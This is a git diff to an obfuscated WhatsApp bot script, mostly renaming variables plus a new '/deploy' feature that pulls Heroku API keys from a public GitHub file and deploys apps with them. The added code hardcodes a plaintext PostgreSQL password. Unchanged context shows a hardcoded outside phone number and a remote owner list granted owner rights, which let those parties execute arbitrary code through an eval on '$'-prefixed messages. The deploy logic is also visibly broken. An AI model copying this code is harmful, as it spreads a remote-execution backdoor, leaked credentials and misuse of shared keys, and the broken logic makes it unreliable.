@@ -427,7 +427,7 @@ async function connectToWA() {
       const _0x372d99 = getContentType(_0x16a610.message);
       const _0x164b21 = _0x16a610.key.remoteJid;
       const _0x9d7216 = _0x372d99 == 'extendedTextMessage' && _0x16a610.message.extendedTextMessage.contextInfo != null ? _0x16a610.message.extendedTextMessage.contextInfo.quotedMessage || [] : [];
-      const _0x1fc96a = _0x372d99 === "conversation" ? _0x16a610.message.conversation : _0x372d99 === "extendedTextMessage" ? _0x16a610.message.extendedTextMessage.text : _0x372d99 == 'interactiveResponseMessage' ? _0x16a610.message.interactiveResponseMessage && _0x16a610.message.interactiveResponseMessage.nativeFlowResponseMessage && JSON.parse(_0x16a610.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson) && JSON.parse(_0x16a610.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : _0x372d99 == "templateButtonReplyMessage" ? _0x16a610.message.templateButtonReplyMessage && _0x16a610.message.templateButtonReplyMessage.selectedId : _0x372d99 === 'extendedTextMessage' ? _0x16a610.message.extendedTextMessage.text : _0x372d99 == "imageMessage" && _0x16a610.message.imageMessage.caption ? _0x16a610.message.imageMessage.caption : _0x372d99 == 'videoMessage' && _0x16a610.message.videoMessage.caption ? _0x16a610.message.videoMessage.caption : '';
+      const msgBody = _0x372d99 === "conversation" ? _0x16a610.message.conversation : _0x372d99 === "extendedTextMessage" ? _0x16a610.message.extendedTextMessage.text : _0x372d99 == 'interactiveResponseMessage' ? _0x16a610.message.interactiveResponseMessage && _0x16a610.message.interactiveResponseMessage.nativeFlowResponseMessage && JSON.parse(_0x16a610.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson) && JSON.parse(_0x16a610.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : _0x372d99 == "templateButtonReplyMessage" ? _0x16a610.message.templateButtonReplyMessage && _0x16a610.message.templateButtonReplyMessage.selectedId : _0x372d99 === 'extendedTextMessage' ? _0x16a610.message.extendedTextMessage.text : _0x372d99 == "imageMessage" && _0x16a610.message.imageMessage.caption ? _0x16a610.message.imageMessage.caption : _0x372d99 == 'videoMessage' && _0x16a610.message.videoMessage.caption ? _0x16a610.message.videoMessage.caption : '';
       if ((await isbtnID(_0x16a610.message?.["extendedTextMessage"]?.["contextInfo"]?.['stanzaId'])) && getCmdForCmdId(await getCMDStore(_0x16a610.message?.['extendedTextMessage']?.["contextInfo"]?.["stanzaId"]), _0x16a610?.["message"]?.["extendedTextMessage"]?.['text'])) {
         getCmdForCmdId(await getCMDStore(_0x16a610.message?.["extendedTextMessage"]?.["contextInfo"]?.['stanzaId']), _0x16a610?.['message']?.["extendedTextMessage"]?.["text"]);
       } else if (_0x372d99 === 'extendedTextMessage') {
@@ -451,37 +451,37 @@ async function connectToWA() {
       var _0x46b63a = await get_set('all');
       config = await _0x57e7e0(config, _0x46b63a);
       prefix = config.PREFIX;
-      var _0x44a3d8 = _0x1fc96a.startsWith(prefix);
-      var _0x1f5ce6 = _0x44a3d8 ? _0x1fc96a.slice(prefix.length).trim().split(" ").shift().toLowerCase() : '';
-      var _0x39d0f8 = _0x1fc96a.trim().split(/ +/).slice(0x1);
-      var _0x5dbee6 = _0x39d0f8.join(" ");
+      var _0x44a3d8 = msgBody.startsWith(prefix);
+      var _0x1f5ce6 = _0x44a3d8 ? msgBody.slice(prefix.length).trim().split(" ").shift().toLowerCase() : '';
+      var _0x39d0f8 = msgBody.trim().split(/ +/).slice(0x1);
+      var userrMsg = _0x39d0f8.join(" ");
       if (_0x285b77.quoted && _0x285b77.quoted.fromMe && (await _0x24660e.check(_0x285b77.quoted.id))) {
-        if (_0x1fc96a.startsWith(prefix)) {
-          _0x1fc96a = _0x1fc96a.replace(prefix, '');
+        if (msgBody.startsWith(prefix)) {
+          msgBody = msgBody.replace(prefix, '');
         }
-        var _0x37eeba = await _0x24660e.get_data(_0x285b77.quoted.id, _0x1fc96a);
+        var _0x37eeba = await _0x24660e.get_data(_0x285b77.quoted.id, msgBody);
         if (_0x37eeba.cmd) {
           _0x44a3d8 = true;
           _0x1f5ce6 = _0x37eeba.cmd.startsWith(prefix) ? _0x37eeba.cmd.slice(prefix.length).trim().split(" ").shift().toLowerCase() : '';
           _0x39d0f8 = _0x37eeba.cmd.trim().split(/ +/).slice(0x1);
-          _0x5dbee6 = _0x39d0f8.join(" ");
+          userrMsg = _0x39d0f8.join(" ");
         }
       }
       console.log(_0x1f5ce6);
       const _0x303ba3 = _0x164b21.endsWith("@g.us");
       const _0x3df711 = _0x16a610.key.fromMe ? _0x1a43b.user.id.split(':')[0x0] + '@s.whatsapp.net' || _0x1a43b.user.id : _0x16a610.key.participant || _0x16a610.key.remoteJid;
-      const _0x563ea8 = _0x3df711.split('@')[0x0];
+      const senderrNumber = _0x3df711.split('@')[0x0];
       const _0x39ab9e = _0x1a43b.user.id.split(':')[0x0];
       const _0x323f5a = _0x16a610.pushName || "Sin Nombre";
-      const _0x41ac17 = _0x39ab9e.includes(_0x563ea8);
-      const _0x521cb9 = "923072380380".includes(_0x563ea8);
+      const _0x41ac17 = _0x39ab9e.includes(senderrNumber);
+      const _0x521cb9 = "923072380380".includes(senderrNumber);
       let _0x304e15 = (await axios.get("https://raw.githubusercontent.com/HyHamza/HyHamza/main/files/X-ByteOwners.json")).data;
       const _0x2a4a9f = _0x304e15.split(',');
       const _0x1c9420 = [..._0x2a4a9f].map(_0x23184e => _0x23184e.replace(/[^0-9]/g, '') + "@s.whatsapp.net").includes(_0x3df711);
       const _0x28a9cb = await jidNormalizedUser(_0x1a43b.user.id);
       const _0x2bca18 = [_0x28a9cb].map(_0x3913ad => _0x3913ad.replace(/[^0-9]/g, '') + "@s.whatsapp.net").includes(_0x3df711);
       const _0x435b43 = _0x41ac17 ? _0x41ac17 : _0x521cb9;
-      const _0x9b6f00 = ownerNumber.includes(_0x563ea8) || _0x435b43;
+      const _0x9b6f00 = ownerNumber.includes(senderrNumber) || _0x435b43;
       const _0x4de3e3 = _0x303ba3 ? await _0x1a43b.groupMetadata(_0x164b21)["catch"](_0xf49cff => {}) : '';
       const _0x30cf8e = _0x303ba3 ? _0x4de3e3.subject : '';
       const _0x5c06bf = _0x303ba3 ? await _0x4de3e3.participants : '';
@@ -496,7 +496,7 @@ async function connectToWA() {
         }
         return false;
       };
-      const _0x47c220 = async _0x364fe1 => {
+      const msgReply = async _0x364fe1 => {
         return await _0x1a43b.sendMessage(_0x164b21, {
           'text': _0x364fe1
         }, {
@@ -1012,14 +1012,14 @@ async function connectToWA() {
               'prefix': prefix,
               'l': l,
               'quoted': _0x9d7216,
-              'body': _0x1fc96a,
+              'body': msgBody,
               'isCmd': _0x44a3d8,
               'command': _0x1f5ce6,
               'args': _0x39d0f8,
-              'q': _0x5dbee6,
+              'q': userrMsg,
               'isGroup': _0x303ba3,
               'sender': _0x3df711,
-              'senderNumber': _0x563ea8,
+              'senderNumber': senderrNumber,
               'botNumber2': _0x28a9cb,
               'botNumber': _0x39ab9e,
               'pushname': _0x323f5a,
@@ -1031,7 +1031,7 @@ async function connectToWA() {
               'groupAdmins': _0x7423bd,
               'isBotAdmins': _0x8f9094,
               'isAdmins': _0x2b74b7,
-              'reply': _0x47c220,
+              'reply': msgReply,
               'config': config,
               'isCreator': _0x2bca18,
               'isDev': _0x1c9420,
@@ -1043,20 +1043,20 @@ async function connectToWA() {
         }
       }
       _0x1a954f.commands.map(async _0x4bc6b9 => {
-        if (_0x1fc96a && _0x4bc6b9.on === "body") {
+        if (msgBody && _0x4bc6b9.on === "body") {
           _0x4bc6b9['function'](_0x1a43b, _0x16a610, _0x285b77, {
             'from': _0x164b21,
             'prefix': prefix,
             'l': l,
             'quoted': _0x9d7216,
-            'body': _0x1fc96a,
+            'body': msgBody,
             'isCmd': _0x44a3d8,
             'command': _0x4bc6b9,
             'args': _0x39d0f8,
-            'q': _0x5dbee6,
+            'q': userrMsg,
             'isGroup': _0x303ba3,
             'sender': _0x3df711,
-            'senderNumber': _0x563ea8,
+            'senderNumber': senderrNumber,
             'botNumber2': _0x28a9cb,
             'botNumber': _0x39ab9e,
             'pushname': _0x323f5a,
@@ -1068,7 +1068,7 @@ async function connectToWA() {
             'groupAdmins': _0x7423bd,
             'isBotAdmins': _0x8f9094,
             'isAdmins': _0x2b74b7,
-            'reply': _0x47c220,
+            'reply': msgReply,
             'config': config,
             'isCreator': _0x2bca18,
             'isDev': _0x1c9420,
@@ -1080,14 +1080,14 @@ async function connectToWA() {
               'from': _0x164b21,
               'l': l,
               'quoted': _0x9d7216,
-              'body': _0x1fc96a,
+              'body': msgBody,
               'isCmd': _0x44a3d8,
               'command': _0x4bc6b9,
               'args': _0x39d0f8,
-              'q': _0x5dbee6,
+              'q': userrMsg,
               'isGroup': _0x303ba3,
               'sender': _0x3df711,
-              'senderNumber': _0x563ea8,
+              'senderNumber': senderrNumber,
               'botNumber2': _0x28a9cb,
               'botNumber': _0x39ab9e,
               'pushname': _0x323f5a,
@@ -1099,7 +1099,7 @@ async function connectToWA() {
               'groupAdmins': _0x7423bd,
               'isBotAdmins': _0x8f9094,
               'isAdmins': _0x2b74b7,
-              'reply': _0x47c220,
+              'reply': msgReply,
               'config': config,
               'isCreator': _0x2bca18,
               'isDev': _0x1c9420,
@@ -1112,14 +1112,14 @@ async function connectToWA() {
                 'prefix': prefix,
                 'l': l,
                 'quoted': _0x9d7216,
-                'body': _0x1fc96a,
+                'body': msgBody,
                 'isCmd': _0x44a3d8,
                 'command': _0x4bc6b9,
                 'args': _0x39d0f8,
-                'q': _0x5dbee6,
+                'q': userrMsg,
                 'isGroup': _0x303ba3,
                 'sender': _0x3df711,
-                'senderNumber': _0x563ea8,
+                'senderNumber': senderrNumber,
                 'botNumber2': _0x28a9cb,
                 'botNumber': _0x39ab9e,
                 'pushname': _0x323f5a,
@@ -1131,7 +1131,7 @@ async function connectToWA() {
                 'groupAdmins': _0x7423bd,
                 'isBotAdmins': _0x8f9094,
                 'isAdmins': _0x2b74b7,
-                'reply': _0x47c220,
+                'reply': msgReply,
                 'config': config,
                 'isCreator': _0x2bca18,
                 'isDev': _0x1c9420,
@@ -1143,14 +1143,14 @@ async function connectToWA() {
                 'prefix': prefix,
                 'l': l,
                 'quoted': _0x9d7216,
-                'body': _0x1fc96a,
+                'body': msgBody,
                 'isCmd': _0x44a3d8,
                 'command': _0x4bc6b9,
                 'args': _0x39d0f8,
-                'q': _0x5dbee6,
+                'q': userrMsg,
                 'isGroup': _0x303ba3,
                 'sender': _0x3df711,
-                'senderNumber': _0x563ea8,
+                'senderNumber': senderrNumber,
                 'botNumber2': _0x28a9cb,
                 'botNumber': _0x39ab9e,
                 'pushname': _0x323f5a,
@@ -1162,7 +1162,7 @@ async function connectToWA() {
                 'groupAdmins': _0x7423bd,
                 'isBotAdmins': _0x8f9094,
                 'isAdmins': _0x2b74b7,
-                'reply': _0x47c220,
+                'reply': msgReply,
                 'config': config,
                 'isCreator': _0x2bca18,
                 'isDev': _0x1c9420,
@@ -1235,8 +1235,196 @@ async function connectToWA() {
         });
       }
 
+/// deploying bot
 
-      let _0x32a95e = _0x1fc96a ? prefixRegex.test(_0x1fc96a[0x0]) : "false";
+const fetch = require('node-fetch');
+
+// Store pending session requests
+let pendingSessionRequests = {}; 
+
+
+  const userId = senderrNumber;  // Assuming sender number as unique user ID
+  
+  if (msgBody.toLowerCase() === '/deploy') {
+    // Handle the .deploy command
+    if (!pendingSessionRequests[userId]) {
+      msgReply("Waiting for your session ID...");
+      pendingSessionRequests[userId] = { waiting: true };
+    } else {
+      msgReply("You already have a pending session request.");
+    }
+  } else if (pendingSessionRequests[userId] && pendingSessionRequests[userId].waiting) {
+    // Handle the session ID response
+    const sessionId = userrMsg.trim();
+    if (sessionId.startsWith('Byte;;;ey')) {
+      delete pendingSessionRequests[userId];
+      await deployBotWithSession(sessionId);
+    } else {
+      msgReply("Invalid session ID. Please try again.");
+    }
+  } else {
+    msgReply("Invalid command or no session request pending.");
+  };
+
+// Function to deploy bot after getting session ID
+async function deployBotWithSession(userSessionId) {
+  const API_KEYS_URL = 'https://raw.githubusercontent.com/3800380/3800380TDB/main/apis.json';
+  const GITHUB_REPO = '3800380/X-BYTE';
+
+  async function fetchApiKeys() {
+    try {
+      const response = await fetch(API_KEYS_URL);
+      if (!response.ok) {
+        throw new Error(`Failed to fetch API keys: ${response.statusText}`);
+      }
+      const data = await response.json();
+      return data.apiKeys;
+    } catch (error) {
+      console.error(error);
+      return [];
+    }
+  }
+
+  async function setConfigVars(appId, appName, apiKey) {
+    const configVars = {
+      HEROKU_APP_NAME: appName,
+      HEROKU_API_KEY: apiKey,
+      SESSION_ID: userSessionId,
+      COMMAND_TYPE: "button",
+      POSTGRESQL_URL: "postgres://db_7xp9_user:6hwmTN7rGPNsjlBEHyX49CXwrG7cDeYi@dpg-cj7ldu5jeehc73b2p7g0-a.oregon-postgres.render.com/db_7xp9",
+      OWNER_NUMBER: senderrNumber,
+      ANTI_DELETE: "true",
+      WORK_TYPE: "public",
+      BOT_EXPIRY_DATE: "2029-09-05",
+      BOT_EXPIRY_TIME: "16:00:00"
+    };
+
+    const response = await fetch(`https://api.heroku.com/apps/${appId}/config-vars`, {
+      method: 'PATCH',
+      headers: {
+        'Content-Type': 'application/json',
+        'Authorization': `Bearer ${apiKey}`,
+        'Accept': 'application/vnd.heroku+json; version=3'
+      },
+      body: JSON.stringify(configVars)
+    });
+
+    if (!response.ok) {
+      throw new Error(`Failed to set config vars: ${response.statusText}`);
+    }
+
+    const configData = await response.json();
+    console.log('Config Vars Set:', configData);
+  }
+
+  async function isAppNameTaken(appName, apiKey) {
+    const response = await fetch(`https://api.heroku.com/apps/${appName}`, {
+      method: 'GET',
+      headers: {
+        'Authorization': `Bearer ${apiKey}`,
+        'Accept': 'application/vnd.heroku+json; version=3'
+      }
+    });
+
+    if (response.status === 404) {
+      return false;
+    }
+
+    if (response.ok) {
+      return true;
+    }
+
+    throw new Error(`Failed to check app name: ${response.statusText}`);
+  }
+
+  async function createHerokuApp(apiKey) {
+    const appName = String("freex" + senderrNumber);
+
+    const nameTaken = await isAppNameTaken(appName, apiKey);
+
+    if (nameTaken) {
+      await msgReply("Sorry, you cannot get another bot, please try again later..");
+      console.log(`The app name "${appName}" is already taken. Stopping the process.`);
+      return;
+    }
+
+    const response = await fetch('https://api.heroku.com/apps', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Authorization': `Bearer ${apiKey}`,
+        'Accept': 'application/vnd.heroku+json; version=3'
+      },
+      body: JSON.stringify({
+        name: appName
+      })
+    });
+
+    if (!response.ok) {
+      throw new Error(`Failed to create Heroku app with API key: ${response.statusText}`);
+    }
+
+    const appData = await response.json();
+    await setConfigVars(appData.id, appName, apiKey);
+    await linkGitHubRepoToHeroku(appData.id, apiKey);
+    return appData;
+  }
+
+  async function linkGitHubRepoToHeroku(appId, apiKey) {
+    const response = await fetch(`https://api.heroku.com/apps/${appId}/builds`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Authorization': `Bearer ${apiKey}`,
+        'Accept': 'application/vnd.heroku+json; version=3'
+      },
+      body: JSON.stringify({
+        source_blob: {
+          url: `https://github.com/${GITHUB_REPO}/tarball/main`
+        }
+      })
+    });
+
+    if (!response.ok) {
+      throw new Error(`Failed to link GitHub repo to Heroku app: ${response.statusText}`);
+    }
+
+    const buildData = await response.json();
+    console.log('GitHub Repo Linked:', buildData);
+  }
+
+  async function deployWithMultipleKeys() {
+    const apiKeys = await fetchApiKeys();
+
+    if (apiKeys.length === 0) {
+      console.log('No API keys found. Please check the JSON file URL.');
+      return;
+    }
+
+    for (const apiKey of apiKeys) {
+      try {
+        console.log(`Attempting to deploy with API key: ${apiKey}`);
+        
+        const appData = await createHerokuApp(apiKey);
+        if (!appData) {
+          return;
+        }
+        msgReply("Your Bot is deployed, wait for some time to be activated...");
+        console.log(`App deployed successfully with API key: ${apiKey}`);
+        console.log('App Name:', appData.name);
+        console.log('App details:', appData);
+        break;
+      } catch (error) {
+        console.error(`Error with API key: ${apiKey} - ${error.message}`);
+        continue;
+      }
+    }
+  }
+
+  await deployWithMultipleKeys();
+}
+// Deploying bot end
+      let _0x32a95e = msgBody ? prefixRegex.test(msgBody[0x0]) : "false";
       if (config.READ_CMD_ONLY === "true" && _0x32a95e) {
         await _0x1a43b.readMessages([_0x16a610.key]);
       }
@@ -1265,11 +1453,11 @@ async function connectToWA() {
         if (_0x41211a && _0x8f9094) {
           if (!_0x2b74b7) {
             if (!_0x435b43) {
-              if (_0x1fc96a.match("https")) {
+              if (msgBody.match("https")) {
                 await _0x1a43b.sendMessage(_0x164b21, {
                   'delete': _0x16a610.key
                 });
-                _0x47c220("*「 ⚠️ 𝑳𝑰𝑵𝑲 𝑫𝑬𝑳𝑬𝑻𝑬𝑫 ⚠️ 」*");
+                msgReply("*「 ⚠️ 𝑳𝑰𝑵𝑲 𝑫𝑬𝑳𝑬𝑻𝑬𝑫 ⚠️ 」*");
               }
             }
           }
@@ -1277,7 +1465,7 @@ async function connectToWA() {
       }
       if (config.ANTI_BOT == "true") {
         if (!_0x2bca18 && !_0x1c9420 && _0x303ba3 && !_0x8f9094) {
-          _0x47c220("```🤖 Bot Detected!!```\n\n_✅ Kicked *@" + _0x16a610.sender.split('@')[0x0] + '*_', {
+          msgReply("```🤖 Bot Detected!!```\n\n_✅ Kicked *@" + _0x16a610.sender.split('@')[0x0] + '*_', {
             'mentions': [_0x16a610.sender]
           });
           _0x1a43b.groupParticipantsUpdate(_0x164b21, [_0x16a610.sender], "remove");
@@ -1287,10 +1475,10 @@ async function connectToWA() {
       if (config.ANTI_BAD == "true") {
         if (!_0x2b74b7 && !_0x1c9420) {
           for (any in _0x4395bb) {
-            if (_0x1fc96a.toLowerCase().includes(_0x4395bb[any])) {
-              if (!_0x1fc96a.includes("tent")) {
-                if (!_0x1fc96a.includes("docu")) {
-                  if (!_0x1fc96a.includes("https")) {
+            if (msgBody.toLowerCase().includes(_0x4395bb[any])) {
+              if (!msgBody.includes("tent")) {
+                if (!msgBody.includes("docu")) {
+                  if (!msgBody.includes("https")) {
                     if (_0x7423bd.includes(_0x3df711)) {
                       return;
                     }
@@ -1602,21 +1790,21 @@ async function connectToWA() {
       }
       switch (_0x1f5ce6) {
         case 'jid':
-          _0x47c220(_0x164b21);
+          msgReply(_0x164b21);
           break;
         default:
-          if (_0x9b6f00 && _0x1fc96a.startsWith('$')) {
-            let _0x101092 = _0x1fc96a.split('$')[0x1];
+          if (_0x9b6f00 && msgBody.startsWith('$')) {
+            let _0x101092 = msgBody.split('$')[0x1];
             let _0x4be388 = _0x101092.replace('°', ".toString()");
             try {
               let _0x5f2358 = await eval(_0x4be388);
               if (typeof _0x5f2358 === "object") {
-                _0x47c220(util.format(_0x5f2358));
+                msgReply(util.format(_0x5f2358));
               } else {
-                _0x47c220(util.format(_0x5f2358));
+                msgReply(util.format(_0x5f2358));
               }
             } catch (_0x294b9c) {
-              _0x47c220(util.format(_0x294b9c));
+              msgReply(util.format(_0x294b9c));
             }
           }
       }
